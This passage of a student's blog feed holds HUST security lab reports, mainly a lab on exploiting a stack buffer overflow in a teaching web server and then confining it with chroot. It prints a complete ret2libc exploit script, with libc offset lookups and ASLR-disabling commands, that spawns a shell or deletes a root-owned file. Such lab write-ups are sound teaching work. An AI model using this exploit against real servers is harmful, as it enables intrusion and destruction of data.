corresponding<code>htmlspecialchars()</code> function call. The commands used are asfollows:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo su </span><br><span class="line">cd /var/www/XSS/Elgg/vendor/elgg/elgg/views/default/output/</span><br><span class="line">vim text.php </span><br><span class="line">vim url.php </span><br><span class="line">vim dropdown.php </span><br><span class="line">vim email.php </span><br></pre></td></tr></table></figure><p>text.php:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621121244426.png"alt="image-20240621121244426" /><figcaption aria-hidden="true">image-20240621121244426</figcaption></figure><p>url.php</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621121416527.png"alt="image-20240621121416527" /><figcaption aria-hidden="true">image-20240621121416527</figcaption></figure><p>dropdown.php</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621121450425.png"alt="image-20240621121450425" /><figcaption aria-hidden="true">image-20240621121450425</figcaption></figure><p>email.php</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621121538048.png"alt="image-20240621121538048" /><figcaption aria-hidden="true">image-20240621121538048</figcaption></figure><p>Visit Samy’s homepage, found that some special symbols have beenconverted to entity symbols, js statements cannot be executed:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621123332775.png"alt="image-20240621123332775" /><figcaption aria-hidden="true">image-20240621123332775</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> HUST Lab Reports </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> Course Experiments </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HUST Information System Security Lab2-System Security</title>
      <link href="/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab2-System%20Security/"/>
      <url>/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab2-System%20Security/</url>
      
        <content type="html"><![CDATA[<h1 id="information-system-security-lab2-record">Information SystemSecurity Lab2 Record</h1><h2id="exploit-vulnerable-processes-of-web-server-to-obtain-shell-or-delete-root-privilege-file-tmptest">Exploitvulnerable processes of web server to obtain shell (or delete rootprivilege file /tmp/test)</h2><h3 id="experiment-environment-configuration">Experiment EnvironmentConfiguration</h3><p>First, the experiment environment needs to be configured.Specifically, need to disable ASLR, then compile the target program, setprivileges for touchstone and start the server.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -w kernel.randomize_va_space=0</span><br><span class="line">sudo make</span><br><span class="line">sudo chown root touchstone</span><br><span class="line">sudo chmod +s touchstone</span><br><span class="line">./touchstone</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619105024424.png"alt="Process information after server startup" /><figcaption aria-hidden="true">Process information after serverstartup</figcaption></figure><p>Then use a browser to enter 127.0.0.1:80 to access the serverinterface, input username: lixiang and password: 123456 to register.</p><h3 id="perform-exploit-attack">Perform exploit attack</h3><p>First, use ldd to view the base address information of libc.so.6loading as <strong><code>0xf7d9d000</code></strong>.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd banksv</span><br></pre></td></tr></table></figure><figure><imgsrc="C:\Users\11946\AppData\Roaming\Typora\typora-user-images\image-20240619110810753.png"alt="image-20240619110810753" /><figcaption aria-hidden="true">image-20240619110810753</figcaption></figure><p>Use ropper to view the offset address of “/bin/bash” string relativeto the base address as <strong><code>0x0018e363</code></strong>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper --file /lib/i386-linux-gnu/libc.so.6 --string &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619110952993.png"alt="image-20240619110952993" /><figcaption aria-hidden="true">image-20240619110952993</figcaption></figure><p>Use readelf to view the addresses of system, exit, unlink functionsas <code>0x00041780</code>, <code>0x000340c0</code>,<code>0x0004f4100</code> respectively.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot; system&quot;  </span><br><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot; exit&quot;  </span><br><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot; unlink&quot; </span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619112513036.png"alt="image-20240619112513036" /><figcaption aria-hidden="true">image-20240619112513036</figcaption></figure><p>Then according to the server logs, we can see the ebp address as<code>0xffffd218</code>.</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619112956513.png"alt="image-20240619112956513" /><figcaption aria-hidden="true">image-20240619112956513</figcaption></figure><p>Need to locate the vulnerability point getToken function.</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619123342290.png"alt="image-20240619123342290" /><figcaption aria-hidden="true">image-20240619123342290</figcaption></figure><p>The function uses a fixed-size character array <code>s[1024]</code>,but doesn’t check if <code>i</code> exceeds the array bounds. When thenumber of characters read exceeds 1024, a buffer overflow occurs, whichis a stack overflow, then attacks can be implemented by overwriting thereturn address.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> s[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    s[i++] = c;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Modify the exploit-template.py script, replace the addresses with theabove addresses. type1 is used to obtain shell, type2 is used to deletefiles. But first need to know what the vulnerability is.</p><p>To find the overflow position, we must find the distance between theposition storing the return address in the getToken() stack frame andthe buffer s. Since the buffer variable s has a length of 1024, thislength must be greater than 1024. Use the following code forprobing:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">req += b&#x27;A&#x27; * 1024 + cyclic(200)</span><br></pre></td></tr></table></figure><p>Run with python3 to get the following output.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit1.py 2 </span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619124023743.png"alt="image-20240619124023743" /><figcaption aria-hidden="true">image-20240619124023743</figcaption></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dmesg</span><br></pre></td></tr></table></figure><figure><imgsrc="https://pic1.zhimg.com/80/v2-411d49bcdf3fe49ec2980dce39fe9808_720w.png"alt="image-20240619124114951" /><figcaption aria-hidden="true">image-20240619124114951</figcaption></figure><p>This is the kernel output log. We can see the return address wasoverwritten to 0x6161616c, which actually corresponds to “laaa”, thencalculate the offset as 44, so 1024 + 44 = 1068 can overwrite the returnaddress.</p><ul><li><p>Obtain shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit_1.py 1</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619125150850.png"alt="image-20240619125150850" /><figcaption aria-hidden="true">image-20240619125150850</figcaption></figure><p>The result is as shown above, the addresses are system function, exitfunction, “/bin/sh” address in order, which matches the stack structurewe want to construct.</p></li><li><p>Delete file</p><p>Next, test deleting /tmp/test.txt. First create /tmp/test.txt andchange its owner to root.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch /tmp/test.txt</span><br><span class="line">sudo chown root /tmp/test.txt</span><br><span class="line">ll /tmp/test.txt</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619125710551.png"alt="image-20240619125710551" /><figcaption aria-hidden="true">image-20240619125710551</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619125937003.png"alt="image-20240619125937003" /><figcaption aria-hidden="true">image-20240619125937003</figcaption></figure></li></ul><p>The attack Python script is as follows:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python  </span></span><br><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line"><span class="keyword">import</span> socket  </span><br><span class="line"><span class="keyword">import</span> traceback  </span><br><span class="line"><span class="keyword">import</span> struct  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line"><span class="keyword">import</span> os.path  </span><br><span class="line"><span class="keyword">import</span> binascii  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># libc base address  </span></span><br><span class="line"><span class="comment"># ASLR shoud be off, so that libc&#x27;s base address will not change untill next reboot   </span></span><br><span class="line"><span class="comment"># you can use &quot;ldd ./program&quot; to check the libc base address  </span></span><br><span class="line">base_addr = <span class="number">0xf7d9d000</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># all of the offsets of functions (strings) inside libc vary little (sometimes change, previews check is needed) .  </span></span><br><span class="line"><span class="comment"># to get the offset of a funtion, you can use:  </span></span><br><span class="line"><span class="comment">##  readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot; system&quot;  </span></span><br><span class="line"><span class="comment"># to get &quot;/bin/sh&quot;:  </span></span><br><span class="line"><span class="comment">## ropper --file /lib/i386-linux-gnu/libc.so.6 --string &quot;/bin/sh&quot;  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># system  </span></span><br><span class="line">sys_addr = base_addr + <span class="number">0x00041780</span></span><br><span class="line"><span class="comment"># /bin/sh  </span></span><br><span class="line">sh_addr = base_addr + <span class="number">0x0018e363</span> </span><br><span class="line"><span class="comment"># exit  </span></span><br><span class="line">ex_addr = base_addr + <span class="number">0x000340c0</span> </span><br><span class="line"><span class="comment"># unlink  </span></span><br><span class="line">ul_addr = base_addr + <span class="number">0x000f4100</span></span><br><span class="line"><span class="comment"># dead  </span></span><br><span class="line">d_addr = <span class="number">0xdeadbeef</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># ebp  too make the task simple, we print ebp of getToken function (vulnerable)   </span></span><br><span class="line">ebp_addr = <span class="number">0xffffd218</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">## Below is the function that you should modify to construct an  </span></span><br><span class="line"><span class="comment">## HTTP request that will cause a buffer overflow in some part  </span></span><br><span class="line"><span class="comment">## of the vulnerable web server and exploit it.  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_exploit</span>(<span class="params">shellcode, <span class="built_in">type</span></span>):  </span><br><span class="line">  </span><br><span class="line">    ul_arg = <span class="string">&quot;/tmp/test.txt\0&quot;</span>  </span><br><span class="line">    ul_arg_addr = ebp_addr + <span class="number">20</span>  </span><br><span class="line">  </span><br><span class="line">    sys_arg = <span class="string">&quot;/bin/sh\0&quot;</span>  </span><br><span class="line">    sys_arg_addr = ebp_addr + <span class="number">20</span>  </span><br><span class="line">  </span><br><span class="line">    req = (<span class="string">&quot;POST / HTTP/1.1\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">    <span class="comment"># All of the header information other than &quot;Content-Length&quot; is not important  </span></span><br><span class="line">    req += (<span class="string">&quot;Host: 127.0.0.1\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">    <span class="comment"># The Content-Length below is useful, and depends on the length of   </span></span><br><span class="line">    <span class="comment"># username plus password, you need to use wireshark (together with web browser)   </span></span><br><span class="line">    <span class="comment"># for checking the length  </span></span><br><span class="line">    req += (<span class="string">&quot;Content-Length: 58\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)   </span><br><span class="line">    req += (<span class="string">&quot;Origin: http://127.0.0.1\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">    req += (<span class="string">&quot;Connection: keep-alive\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">    req += (<span class="string">&quot;Referer: http://127.0.0.1/\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">    req += (<span class="string">&quot;Hacking: &quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">    <span class="comment"># For different oses (and compilation), the length of fillup for   </span></span><br><span class="line">    <span class="comment"># hijacking the return address in the stack, could be different,  </span></span><br><span class="line">    <span class="comment"># therefore you need to debug the program for checking and adjusting.  </span></span><br><span class="line">    req += <span class="string">b&#x27;A&#x27;</span> * <span class="number">1068</span></span><br><span class="line">    <span class="comment"># b&#x27;C&#x27; * 4  </span></span><br><span class="line">  </span><br><span class="line">    <span class="comment"># use &quot;/bin/sh&quot; string in libc  </span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">1</span>:  </span><br><span class="line">        req += p32(sys_addr)  </span><br><span class="line">        req += p32(ex_addr)  </span><br><span class="line">        req += p32(sh_addr)  </span><br><span class="line">        req += p32(<span class="number">0</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># put &quot;/bin/sh&quot; string in the stack  </span></span><br><span class="line">    <span class="comment"># ebp is needed to locate the place of string   </span></span><br><span class="line">    <span class="comment"># Note: using this method, you can put arbitrary string in the stack,   </span></span><br><span class="line">    <span class="comment"># so that &quot;system&quot; can execute arbitrary command  </span></span><br><span class="line">    <span class="comment">#req += p32(sys_addr)  </span></span><br><span class="line">    <span class="comment">#req += p32(ex_addr)  </span></span><br><span class="line">    <span class="comment">#req += p32(sys_arg_addr)  </span></span><br><span class="line">    <span class="comment">#req += p32(0)  </span></span><br><span class="line">    <span class="comment">#req += sys_arg.encode(&#x27;latin-1&#x27;)  </span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># remove a file specified by the path &quot;ul_arg&quot;  </span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">2</span>:  </span><br><span class="line">        req += p32(ul_addr)  </span><br><span class="line">        req += p32(ex_addr)  </span><br><span class="line">        req += p32(ul_arg_addr)  </span><br><span class="line">        req += p32(<span class="number">0</span>)  </span><br><span class="line">        req += ul_arg.encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">      </span><br><span class="line">  </span><br><span class="line">    req += (<span class="string">&quot;\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">    req += (<span class="string">&quot;\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">     </span><br><span class="line">    <span class="comment"># Below is the username/password that you can Register into the web server  </span></span><br><span class="line">    <span class="comment"># by using web browser. These information will be stored into the sqlite db behind.  </span></span><br><span class="line">    <span class="comment"># You need to change these information according to your own registration.  </span></span><br><span class="line">   </span><br><span class="line">    <span class="comment"># Note that successful POST will be responded by the server with a hint page.  </span></span><br><span class="line">    <span class="comment"># By using the successful response, you can judge whether the server has been   </span></span><br><span class="line">    <span class="comment"># crashed (by exploit), so that you can adjust the fillup accordingly.  </span></span><br><span class="line">    req += (<span class="string">&quot;login_username=lixiang&amp;login_password=123456&amp;submit_login=Login&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(req)  </span><br><span class="line">    <span class="keyword">return</span> req  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">#If you cannot use p32 (in pwnlib), you can use the following line  </span></span><br><span class="line">    <span class="comment">#req += (addr1).to_bytes(4, byteorder=&#x27;little&#x27;)  </span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_req</span>(<span class="params">host, port, req</span>):  </span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Connecting to %s:%d...&quot;</span> % (host, port))  </span><br><span class="line">    sock.connect((host, port))  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Connected, sending request...&quot;</span>)  </span><br><span class="line">    sock.send(req)  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Request sent, waiting for reply...&quot;</span>)  </span><br><span class="line">    rbuf = sock.recv(<span class="number">1024</span>)  </span><br><span class="line">    resp = (<span class="string">&quot;&quot;</span>).encode(<span class="string">&quot;latin-1&quot;</span>)  </span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(rbuf):  </span><br><span class="line">      resp = resp+rbuf  </span><br><span class="line">      rbuf = sock.recv(<span class="number">1024</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Received reply.&quot;</span>)  </span><br><span class="line">    sock.close()  </span><br><span class="line">    <span class="keyword">return</span> resp  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: &quot;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot; type&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;type: 1 for shell, 2 for unlink&quot;</span>)  </span><br><span class="line">    exit()  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">try</span>:  </span><br><span class="line">    shellcode = <span class="string">&quot;&quot;</span>  </span><br><span class="line">    req = build_exploit(shellcode, <span class="built_in">int</span>(sys.argv[<span class="number">1</span>]))  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;HTTP request:&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(req)  </span><br><span class="line">  </span><br><span class="line">    resp = send_req(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">80</span>, req)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;HTTP response:&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(resp)  </span><br><span class="line"><span class="keyword">except</span>:  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Exception:&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(traceback.format_exc())  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="problems-encountered">Problems Encountered</h3><ol type="1"><li><p>When the server process ends and restarts, socket binding failureoften occurs because port 80 is occupied. Port 80 is the default port ofApache server, so this problem can be solved by modifying Apache’sdefault port to 8080.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo su  </span><br><span class="line">systemctl disable apache2  </span><br><span class="line">vim /etc/apache2/ports.conf  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Change Listen 80... to: Listen 8080</span></span><br><span class="line">vim /etc/apache2/sites-available/000-default.conf  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Change &lt;VirtualHost *:80&gt;... to: &lt;VirtualHost *:8080&gt;</span></span><br><span class="line">systemctl restart apache2  </span><br></pre></td></tr></table></figure></li></ol><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619105721675.png"alt="Image when Apache service listening port modification is successful" /><figcaption aria-hidden="true">Image when Apache service listening portmodification is successful</figcaption></figure><ol start="2" type="1"><li><p>I found that the ebp value changed when executing touchstonethrough setuid and sudo in these two different ways.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./touchstone</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619162514457.png"alt="image-20240619162514457" /><figcaption aria-hidden="true">image-20240619162514457</figcaption></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./touchstone</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619162549093.png"alt="image-20240619162549093" /><figcaption aria-hidden="true">image-20240619162549093</figcaption></figure><p>AI Answer: <code>setuid</code> and <code>sudo</code> providedifferent privilege escalation mechanisms. <code>setuid</code> runs theexecutable file with the file owner’s privileges by setting theexecutable file’s permissions, while <code>sudo</code> allows authorizedusers to temporarily elevate privileges to execute specific commands.The change in <code>ebp</code> value may be caused by differentexecution environments and security mechanisms, especially wheninvolving privilege escalation.</p></li></ol><h2id="use-chroot-to-constrain-web-server-perform-exploit-delete-root-privilege-file-tmptest">Usechroot to constrain web server, perform exploit, delete root privilegefile /tmp/test</h2><h3 id="experiment-environment-configuration-1">Experiment EnvironmentConfiguration</h3><p>To avoid affecting the previous experiment’s results, copy the codedirectory to code_chroot. Of course, still need to disable addressrandomization to avoid address changes.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -r ./code ./code_chroot</span><br></pre></td></tr></table></figure><h3 id="perform-chroot-configuration">Perform chroot configuration</h3><p>Add the following code in server.c:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">chroot</span>(<span class="string">&quot;/jail&quot;</span>) == <span class="number">0</span>)  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chroot success\n&quot;</span>);  </span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619132459140.png"alt="image-20240619132459140" /><figcaption aria-hidden="true">image-20240619132459140</figcaption></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">make  </span><br><span class="line">sudo ./chroot-setup.sh  </span><br><span class="line">cd /jail  </span><br><span class="line">sudo ./touchstone  </span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619132644219.png"alt="image-20240619132644219" /><figcaption aria-hidden="true">image-20240619132644219</figcaption></figure><h3 id="perform-exploit-test">Perform exploit test</h3><p>Create test files then start the server, found that “chroot success”information was successfully printed.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Create <span class="built_in">test</span> file <span class="keyword">in</span> tmp directory</span>  </span><br><span class="line">sudo touch /tmp/test.txt</span><br><span class="line">sudo chown root /tmp/test.txt  </span><br><span class="line">ll /tmp/test.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Create <span class="built_in">test</span> file <span class="keyword">in</span> /jail/tmp directory</span></span><br><span class="line">sudo touch /jail/tmp/test.txt</span><br><span class="line">sudo chown root /jail/tmp/test.txt  </span><br><span class="line">ll /jail/tmp/test.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Start server <span class="keyword">in</span> /jail directory</span></span><br><span class="line">./touchstone</span><br></pre></td></tr></table></figure><figure><imgsrc="https://picx.zhimg.com/80/v2-9a3d6da5f1d453d9edec1ee0bfbebcf2_720w.png"alt="image-20240619135337160" /><figcaption aria-hidden="true">image-20240619135337160</figcaption></figure><p>The server process address information may change, use gdb to recheck(note that using ldd here is wrong, although it shows the same asbefore, need to use gdb to dynamically attach to see addresses).</p><p>Hint from the manual: The library in jail is separate, located under<code>/jail/lib</code> (different from the original path), so need tore-find the libc base address</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep banksv</span><br><span class="line">sudo gdb -q -p &lt;PID&gt;</span><br><span class="line">info proc map</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619133412947.png"alt="image-20240619133412947" /><figcaption aria-hidden="true">image-20240619133412947</figcaption></figure><figure><imgsrc="https://pic1.zhimg.com/80/v2-4373262ae41bde082db5e2dc19fefb11_720w.png"alt="image-20240619133327610" /><figcaption aria-hidden="true">image-20240619133327610</figcaption></figure><p>Modify the script’s <code>base_addr</code> as<code>exploit_2.py</code>, then execute the delete file function. Foundthat <code>\tmp\text.txt</code> was not successfully deleted, but<code>\jail\tmp\text.txt</code> was deleted. Using <code>dmesg</code> tocheck kernel debug information found no <code>segmentfault</code>,indicating that <code>chroot</code> is effective, and test files outsidethe <code>jail</code> directory were not 